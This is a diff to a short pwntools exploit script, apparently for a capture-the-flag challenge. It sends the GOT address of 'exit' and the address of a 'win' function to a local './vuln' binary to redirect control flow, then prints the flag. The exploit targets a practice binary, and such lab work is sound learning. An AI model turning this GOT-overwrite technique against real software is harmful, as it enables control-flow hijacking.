@@ -1,8 +1,8 @@
 from pwn import *
 
-e = ELF("./vuln")
-p = e.process()
+context.binary = "./vuln"
+p = process()
 
-p.sendline(str(e.got["exit"]).encode("ascii"))
-p.sendline(str(e.functions["win"].address).encode("ascii"))
+p.sendline(str(context.binary.got["exit"]).encode("ascii"))
+p.sendline(str(context.binary.functions["win"].address).encode("ascii"))
 log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
